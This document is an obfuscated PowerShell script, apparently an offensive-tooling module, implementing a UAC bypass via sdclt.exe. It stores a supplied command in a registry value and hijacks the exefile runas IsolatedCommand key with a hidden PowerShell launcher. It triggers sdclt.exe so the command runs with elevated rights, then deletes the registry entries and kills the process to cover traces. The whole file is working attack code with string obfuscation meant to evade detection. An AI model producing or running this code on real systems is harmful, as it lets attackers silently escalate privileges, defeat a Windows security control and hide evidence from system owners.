 SET-iteM ("{2}{0}{4}{3}{1}" -f'i','I25x','vAR','lE:Ej','aB') ( [TYPe]("{2}{0}{1}" -f'n','T','ENvirOnmE')  );function INvoKe-S`dc`lt`ByPaSs {


    [CmdletBinding(SUPPOrTssHOULdPROCesS = ${Tr`Ue}, CoNFIrmImpACt = "ME`DiuM")]
    Param (
        [Parameter(mAnDaTORY = ${T`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${c`omMAnD},

        [Switch]
        ${fo`RCE}
    )
    ${con`S`ENTPRom`pt} = (&("{0}{1}{2}" -f'Get','-Item','Property') (("{8}{11}{1}{6}{15}{3}{5}{14}{13}{17}{10}{0}{12}{7}{2}{16}{4}{9}" -f 'owsuERCur','M:uE','li','OFTWAR','iesuERSyste','E','R','uERPo','H','m','ERWind','KL','rentVersion','Microsoft','uER','S','c','u')).replACE(([cHAR]117+[cHAR]69+[cHAR]82),'\'))."c`onsENtprOM`PTbeHav`iOr`ADmIN"
    ${S`e`CuRe`dESktOppRompT} = (.("{3}{1}{4}{2}{0}"-f'erty','e','p','G','t-ItemPro') (("{14}{8}{15}{0}{11}{9}{7}{6}{16}{1}{10}{13}{4}{2}{3}{5}{17}{12}" -f 'i','er','Xj','Sy','licies5','s','j','ws5X','SOFT','do','s','n','em','ion5XjPo','HKLM:5Xj','WARE5XjMicrosoft5XjW','CurrentV','t')).ReplACE(([ChAR]53+[ChAR]88+[ChAR]106),[stRInG][ChAR]92))."P`RO`MpTOnsEc`UREdes`KtoP"

    if(($(&("{0}{1}"-f 'whoa','mi') ("{2}{0}{1}"-f 'gro','ups','/')) -like ("{1}{4}{3}{2}{0}" -f '4*','*S','5-32-54','1-','-'))."l`EnGTh" -eq 0) {
        ("{8}{0}{5}{6}{7}{1}{4}{3}{9}{2}" -f '!] Curre',' lo','!','ministra','cal ad','nt user n','o','t a','[','tor')
        Throw (("{7}{6}{0}{2}{4}{1}{3}{5}"-f'e','st','r not','r',' a local admini','ator!','nt us','Curre'))
    }
    if (($(&("{2}{1}{0}"-f'oami','h','w') ("{2}{0}{1}"-f'rou','ps','/g')) -like ("{3}{2}{0}{4}{1}" -f'16','8192*','1-','*S-','-'))."lEng`Th" -eq 0) {
        ("{2}{8}{7}{4}{1}{6}{3}{9}{5}{0}"-f'!',' a medium','[!','grit','in','ocess',' inte','Not ','] ','y pr')
        Throw (("{8}{7}{6}{0}{9}{4}{2}{5}{1}{3}" -f 'm int','e','pro','ss!','grity ','c',' mediu','n a','Not i','e'))
    }

    if(${CoNSENtpr`o`mPt} -Eq 2 -And ${SEcU`R`edEs`KtOpPr`Ompt} -Eq 1){
        ((("{4}{8}{2}{6}{0}{3}{9}{1}{11}{10}{5}{7}"-f 's set to agA','e does n',' ','Alw','U','s this set','i','ting.','AC','ays NotifyagA. This modul','pas','ot by'))  -CrePlACe  ([chAR]97+[chAR]103+[chAR]65),[chAR]39)
        exit
    }
    else{
        
        
        ${R`E`gpaTH} = ((("{0}{7}{6}{3}{4}{8}{2}{10}{9}{1}{5}" -f'HK','3','o','2Micr','o','2WindowsU32Update','3','CU:SoftwareU','s','U','ft'))  -CRepLACE([ChAR]85+[ChAR]51+[ChAR]50),[ChAR]92)
        ${pA`RTS} = ${Re`g`pATh}.("{0}{1}" -f 'spli','t').Invoke('\');
        ${Pa`Th} = ${REgP`ATh}.("{0}{1}" -f 'spli','t').Invoke("\")[0..(${P`ARts}."co`UnT" -2)] -join '\';
        ${n`AME} = ${p`ArTS}[-1];
        ${n`Ull} = .("{3}{2}{1}{0}" -f 'erty','mProp','e','Set-It') -Force -Path ${P`ATH} -Name ${n`AME} -Value ${COM`M`AnD};


        ${ExEc`omma`NDpath} = ((("{12}{1}{6}{9}{2}{4}{0}{14}{8}{3}{5}{11}{7}{10}{15}{13}"-f'e','CU:{0}','re{0}C','exefile{0}','lass','sh','S','0}runas{0','{0}','oftwa','}','ell{','HK','nd','s','comma'))-f[ChaR]92)
        ${l`Aun`cHErcoM`MAND} = ${P`shOMe} + '\' + ('p'+'owershell.e'+'xe'+' '+'-'+'NoP '+'-Non'+'I'+' '+'-w'+' '+'H'+'id'+'den '+'-'+'c '+('8'+'G'+'Kx=8GK((gp'+' ')."re`P`lacE"(([ChAr]56+[ChAr]71+[ChAr]75),[sTRIng][ChAr]36)+(('HK'+'CU:S'+'of'+'twarev'+'leMi'+'c'+'ro'+'softvleW'+'ind'+'o'+'ws'+' ') -repLaCe  ([ChAr]118+[ChAr]108+[ChAr]101),[ChAr]92)+'Up'+'da'+'te)'+'.'+'Update); '+'p'+'owershe'+'l'+'l '+'-'+'NoP '+'-N'+'onI'+' '+'-w'+' '+'H'+'i'+'dden '+'-enc'+' '+('{0}x')  -F  [chAR]36)

        if (${f`o`Rce} -or ((&("{4}{0}{2}{3}{1}" -f 't','temProperty','-','I','Ge') -Path ${ex`ecomM`An`Dp`Ath} -Name ("{1}{3}{0}{2}"-f 'lat','I','edCommand','so') -ErrorAction ("{3}{2}{0}{1}{4}"-f'lyCon','ti','lent','Si','nue')) -eq ${n`UlL})){
            &("{0}{1}" -f'New-','Item') ${execOMM`And`PA`TH} -Force |
                .("{1}{0}{4}{2}{3}" -f 'It','New-','Pr','operty','em') -Name ("{3}{2}{1}{4}{0}" -f'd','Comm','ated','Isol','an') -Value ${LauNChe`R`Co`MmAnd} -PropertyType ("{1}{0}"-f'g','strin') -Force | .("{0}{1}{2}" -f 'Out','-Nul','l')
        }else{
            &("{3}{0}{1}{2}"-f'-','Warni','ng','Write') ("{7}{5}{4}{1}{0}{2}{6}{3}"-f're','al','ady exists, c','g -Force','y ','e','onsider usin','K')
            exit
        }

        if (&("{0}{1}{2}" -f 'Te','st-','Path') ${EXe`co`Mm`A`NdpatH}) {
            &("{1}{0}{2}{3}" -f 'ri','W','te-V','erbose') ("{4}{3}{11}{1}{10}{5}{9}{7}{2}{0}{8}{6}" -f 'ack the exe runas exte','i','j','reated registry ent','C','s','sion','hi','n',' to ','e','r')
        }else{
            &("{0}{3}{2}{1}"-f 'W','arning','ite-W','r') ("{0}{10}{7}{1}{4}{9}{2}{3}{8}{5}{11}{6}" -f'Fa',' c',',',' e','reate ','ti','g','d to','xi','registry key','ile','n')
            exit
        }

        ${S`dCLtpA`Th} = &("{1}{2}{0}" -f'h','Join-','Pat') -Path ( (  GeT-varIablE ("{0}{1}{2}"-f'e','jI2','5X') -vAL  )::("{1}{2}{3}{0}" -f'ath','Get','F','olderP').Invoke(("{1}{0}"-f 'tem','Sys'))) -ChildPath ("{1}{2}{0}"-f'lt.exe','sd','c')
        if (${PsC`m`dLeT}.("{1}{0}{3}{2}{4}" -f 'ld','Shou','roc','P','ess').Invoke(${Sd`CLt`PATh}, ("{2}{1}{0}" -f 'rocess','p','Start '))) {
            ${Pr`oCe`ss} = &("{2}{0}{3}{1}"-f 'tart-','s','S','Proces') -FilePath ${s`dc`LTpatH} -ArgumentList ("{3}{2}{1}{0}" -f'v','e','fel','/kickof') -PassThru
            &("{3}{0}{1}{2}" -f'-Ve','rbo','se','Write') ("{4}{2}{3}{1}{0}" -f 'exe','t.','ted s','dcl','Star')
        }

        
        &("{1}{0}{2}"-f 'bo','Write-Ver','se') ("{0}{6}{4}{7}{5}{3}{1}{2}" -f'Slee','r ','payload',' trigge','5 ','econds to','ping ','s')
        if (-not ${PsBOU`NDPar`AME`TerS}[("{1}{0}"-f 'hatIf','W')]) {
            &("{3}{2}{1}{0}"-f 'eep','-Sl','art','St') -Seconds 5
        }

        ${E`xEFiL`EpA`TH} = ((("{1}{4}{6}{3}{0}{2}{5}" -f'e','HKCU','{0}Classes{0}ex','ar',':{0}S','efile','oftw'))  -F[ChaR]92)
				${PAYL`o`ADPAtH} = ((("{0}{3}{4}{5}{1}{2}" -f'HKCU:','icrosoftQlEWindow','s','Sof','t','wareQlEM'))."Re`pLa`CE"(([chaR]81+[chaR]108+[chaR]69),[StrING][chaR]92))
				${Pa`YLoA`dk`EY} = ("{2}{1}{0}" -f'te','a','Upd')

        if (.("{2}{1}{0}" -f'h','at','Test-P') ${E`xEfIlEpa`TH}) {
            
            &("{0}{2}{1}"-f'Remo','e-Item','v') ${ExE`FIleP`AtH} -Recurse -Force
						&("{0}{4}{2}{1}{5}{3}"-f'Rem','P','-Item','perty','ove','ro') -Force -Path ${PAy`LoA`dP`AtH} -Name ${pA`Ylo`ADK`Ey}
            &("{3}{4}{0}{2}{1}"-f '-Verb','se','o','Wri','te') ("{0}{2}{1}{4}{3}"-f'Rem','ry ent','oved regist','s','rie')
        }

        if(&("{0}{2}{1}" -f'Get-','cess','Pro') -Id ${prO`C`EsS}."i`D" -ErrorAction ("{2}{1}{3}{0}{4}" -f'nu','entlyC','Sil','onti','e')){
            &("{1}{0}{2}{3}" -f 'p-P','Sto','roce','ss') -Id ${P`RocEss}."I`d"
            .("{0}{2}{1}"-f 'W','bose','rite-Ver') ("{4}{3}{0}{5}{1}{2}"-f 'unn','g sdclt proces','s','lled r','Ki','in')
        }
    }
}